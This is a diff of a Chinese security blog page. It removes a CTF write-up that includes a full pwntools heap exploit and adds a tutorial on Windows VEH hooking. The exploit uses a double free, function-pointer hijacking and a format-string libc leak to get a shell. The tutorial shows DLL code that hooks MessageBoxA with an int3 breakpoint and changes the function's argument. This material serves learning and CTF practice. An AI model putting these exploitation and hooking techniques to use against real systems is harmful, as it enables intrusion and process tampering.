@@ -15,24 +15,19 @@
 
 
 
-<meta name="description" content="国庆复的盘，今天补一下">
+<meta name="description" content="学一学 hook 专题，今天是 VEH hook。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2020浙江省赛 pwn2 writeup">
-<meta property="og:url" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/index.html">
+<meta property="og:title" content="Hook专题4-hotfix hook">
+<meta property="og:url" content="http://example.com/2022/10/07/Hook5-VEH%20hook/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="国庆复的盘，今天补一下">
+<meta property="og:description" content="学一学 hook 专题，今天是 VEH hook。">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png">
-<meta property="og:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png">
-<meta property="article:published_time" content="2021-10-26T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-18T06:51:22.699Z">
+<meta property="og:image" content="http://example.com/2022/10/07/Hook5-VEH%20hook/1.png">
+<meta property="article:published_time" content="2022-10-07T10:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-07T11:49:08.401Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png">
+<meta name="twitter:image" content="http://example.com/2022/10/07/Hook5-VEH%20hook/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -66,7 +61,7 @@
 <link href="//lib.baomitu.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2020浙江省赛 pwn2 writeup | xia0ji233&#39;s blog</title>
+<title>Hook专题4-hotfix hook | xia0ji233&#39;s blog</title>
 
 <script src="//lib.baomitu.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//lib.baomitu.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -209,11 +204,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-2020浙江省赛pwn2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Hook5-VEH hook" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/" class="article-date">
-      <time datetime="2021-10-26T02:00:00.000Z" itemprop="datePublished">2021-10-26</time>
+      <a href="/2022/10/07/Hook5-VEH%20hook/" class="article-date">
+      <time datetime="2022-10-07T10:00:00.000Z" itemprop="datePublished">2022-10-07</time>
 </a>
 
 
@@ -228,7 +223,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2020浙江省赛 pwn2 writeup
+      Hook专题4-hotfix hook
     </h1>
   
 
@@ -237,7 +232,7 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/pwn/">pwn</a>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/reverse/">reverse</a><a class="article-category-link" href="/categories/ctf/reverse/hook/">hook</a>
     </div>
 
 
@@ -249,54 +244,31 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>国庆复的盘，今天补一下</p>
+        <p>学一学 hook 专题，今天是 VEH hook。</p>
 <span id="more"></span>
 
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec保护全开。</p>
-<p>经典菜单题，没有去符号表，查看menu函数发现只有添加和删除操作，但是可以发现删除操作是通过函数指针实现的。并且分little 和 big的区别，free little就是一个free，free big 就是要把那个堆块里面的内容指向的堆块free了还要把本身给free，但是指针并没有清零。造成了UAF漏洞，并且在add的时候根据字符串长度来分配大小，并且会先读栈上，然后在strcpy拷贝，这就意味着输入不能存在\0。并且你输入的size只跟你输入大小有关，它拷贝分配的大小还是用strlen算出来长度再malloc然后strcpy，这一波操作下来就没办法溢出操作，并且由于\0截断也限制了很多。开了PIE无法unlink，和用got表泄露libc，而泄露程序基址也是比较难的(虽然正解是泄露程序基址的awa)。</p>
-<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>考虑劫持函数指针，直接覆盖部分来修改函数，发现freebig和freelittle函数指针都在堆上面，由于只有最后三位相同，而我们覆盖是以字节为单位的，在调试可以选择先关了ASLR，让它在确定位置上加载不妨碍调试，出了之后也就需要爆破这半个字节十六分之一的概率还是比较可观的。但是我的电脑不知道为什么特殊一点的，它程序加载的基址末五位都是0，那这样我调试就更加方便了，直接写上两个字节过去就完事了。如果你的你的机子没有这个特性可以参考以下操作。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo su</span><br><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<h2 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h2><p>今天学了比较新的一个 hook 的姿势：利用异常处理去hook。</p>
+<h3 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h3><h4 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h4><p>SEH 即 结构化异常处理(Structure Exception Handler)，是Windows操作系统提供的强大异常处理功能。当程序执行过程中发生异常时，零环会使用<code>KiDispatchException</code>判断是否有内核调试器。如果没有调试器，零环转交给三环的<code>KiDispatchException</code>，开始找是否有异常处理程序（SEH、VEH）。如果已安装，会调用异常处理程序进行处理</p>
+<blockquote>
+<p>异常处理流程：异常产生-&gt;调试器-&gt;VEH-&gt;SEH-&gt;TopLevelEH-&gt;调试器</p>
+</blockquote>
+<p>SEH有很多缺点（基于线程、基于栈、处理优先级低）等等。</p>
+<h4 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h4><p>向量化异常处理(Vectored Exception Handler)，我们可以用<code>AddVectoredExceptionHandler</code>函数注册自定义的VEH。当捕获到异常时，我们会拿到一个<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-exception_pointers">_EXCEPTION_POINTERS</a>类型的参数。而这个参数的成员<code>ContextRecord</code>保存着异常触发时CPU各种寄存器的值，这就意味着我们可以直接修改EIP/RIP寄存器，从而达到指令跳转的目的。</p>
+<h3 id="VEH-hook"><a href="#VEH-hook" class="headerlink" title="VEH hook"></a>VEH hook</h3><p>之前用的 inline hook，IAT hook，virtual hook 以及 hotfix hook，都是通过修改内存来劫持的控制流，因为都对内存进行了直接修改所以很容易被检测到。</p>
+<p>而在 VEH hook 中，我们可以使用硬件断点搞出一个异常来，然后转入我们的异常处理函数，这个是后话了，我们先学 int 3 断点去进行 VEH hook。</p>
+<p>之前看 《加密与解密》 的书也讲到了，int 3就是一个断点指令，在我们打普通断点的时候，会把指令的第一个字节改为 0xCC 也就是 int 3指令的字节码，继续执行的时候会把 0xCC 替换回原指令字节。原理就是 0xCC 指令在执行的时候会引发一个 BREAKPOINT_EXCEPTION，被调试器接收到了，调试器暂时挂起了这个程序然后把当前程序的状态展示给我们看。若没有调试器，则我们需要自己写处理函数去处理这个异常。</p>
+<p>创建一个dll</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HOOK</span> &#123;</span></span><br><span class="line">    BYTE OldByte;</span><br><span class="line">&#125;HookInfo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> HookAddr = (<span class="keyword">size_t</span>)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"><span class="function">LONG NTAPI <span class="title">Handler</span><span class="params">(struct _EXCEPTION_POINTERS *ExceptionInfo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == HookAddr) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span>* str = <span class="string">&quot;xia0ji233&quot;</span>;</span><br><span class="line">            *(DWORD *)(ExceptionInfo-&gt;ContextRecord-&gt;Esp + <span class="number">0x8</span>) = (DWORD)str;</span><br><span class="line">            ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">SetHook</span><span class="params">(<span class="keyword">size_t</span> FunctionAddr)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)FunctionAddr, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    HookInfo.OldByte = *(<span class="keyword">char</span>*)FunctionAddr;</span><br><span class="line">    *(<span class="keyword">char</span>*)FunctionAddr = <span class="number">0xCC</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)FunctionAddr, <span class="number">1</span>, old, &amp;old);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">SetHook</span>(HookAddr);</span><br><span class="line">        <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>,(PVECTORED_EXCEPTION_HANDLER)Handler);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这一波操作之后会让程序和libc在确定的基址上运行，这样如果需要爆破，调试起来就更方便了，我的机子重启之后这个默认变回2的好像。</p>
-<p>那么我们就先用double free的方式将堆块申请到伪造的区域造成堆重叠覆盖指针区域为printf，至于为什么printf呢，那是因为可以用%p泄露栈或寄存器上的变量，栈上面或多或少都会有libc的地址存在的。</p>
-<p>那我们先添加五组堆块</p>
-<p>第一个堆块：big ，在数据区域伪造出一个0x31大小的堆块一遍等会申请。</p>
-<p>第二个堆块：big，把它的size区域变成0x31以便等会申请。</p>
-<p>第三个堆块：small，用于double free 的堆块</p>
-<p>第四个堆块：small，用于double free 的堆块</p>
-<p>第五个堆块：small，</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#交互函数会在最后完整的exp中给出</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p>此时堆布局是这样的：</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png" alt="1"></p>
-<p>箭头所指的两个地方就是要伪造堆块的区域。</p>
-<p>然后free掉第三个第四个第三个的顺序让bin中存在两个相同的堆块，add第一个堆块的时候末尾因为有其它堆块的地址，因此直接改最后一位即可以把fd改成刚刚第二个堆伪造的size区域，等会申请到这里的堆块之后就可以直接修改末尾的指针把这个free big函数改成printf函数。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure>
-
-<p>此时堆布局如下所示</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png" alt="2"></p>
-<p>由于改变了堆结构导致指令无法识别到堆块了，但那些不重要，我们可以看到那个原本存free big的函数已经变成了printf函数的偏移(0x9a0)。</p>
-<p>改完之后呢，依旧是用第三个堆块和第四个堆块double free，然后把堆块申请到第一个伪造的那个地方。然后free第一个堆块，而我们这一次申请就在上面填上类似%p之类的字符，为什么能成功呢？仔细看它delete一个堆块的操作，是以堆块的地址作为参数的而不是以堆块的内容作为参数。所以如果上面放上%p之类的字符串，delete 之后就会printf这堆块上的内容，识别到%p之类的格式化字符串就会对应泄露出一些地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p>做完这些操作之后可以看到一下堆块的布局。</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png" alt="3"></p>
-<p>free 1之后可以泄露出一个类似libc的地址。</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png" alt="4"></p>
-<p>因为这属于无差别泄露，就是说你其实也不知道这个泄露的是个什么鬼东西，那你就直接vmmap查看libc的code段加载地址在哪里，再把这个数和基址一减，得到一个偏移，那么接受到这个数值之后减去那个偏移就能固定泄露出libc的基址了。</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png" alt="5"></p>
-<p>虽然泄露出来的地址属于ld.so中的地址，但是由于libc和ld.so是紧挨着的，不妨碍能通过它泄露出libc的地址，最后计算得到偏移0x5ed700。到这里泄露libc的工作就算完成啦。</p>
-<h2 id="劫持程序流"><a href="#劫持程序流" class="headerlink" title="劫持程序流"></a>劫持程序流</h2><p>这里还是靠函数指针，既然libc地址已经泄露得到了，那么可以故技重施，再把函数指针改成system，然后参数给/bin/sh，delete之后直接getshell，非常稳，当然这里我偷懒了，我直接换成onegadget的地址了，因为后期考虑到堆块数量可能不够，它堆块指针的分配机制是这样的：</p>
-<p>建立一个数组a，初始都为0，每次add，会把这个数组置为1，free把对应这个下标置为0。add只会考虑该数组这个下标的值为0的时候才会分配对应偏移的指针给当前add的堆块。但是由于之前我们用过了很多double free，因为有两次free是对同一个堆块操作，那个数组虽然会变成0，但是也有两次是对同一个元素操作了，我们整整又是拿出来了三个堆块，所以每次double free可用的数组指针永久少1，并且由于之前那些操作，可以利用的堆可以说以我目前的能力我是想放弃那些堆块重新开始的。因此再次的double free 只需要劫持一个函数指针为onegadget即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里也很幸运，试到第三个onegadget就成功了。如果不行应该换成system然后之前再同样的方式弄出来/bin/sh字符串就行，但是我不确定堆块数量能不能够用。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10000</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Taste: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./candyBox&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x5ed700</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>下面是成功getshell的截图，最后写出来需要爆破的就是printf那半个字节，跑到远程环境注意一下应该问题不大。</p>
-<p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png" alt="6"></p>
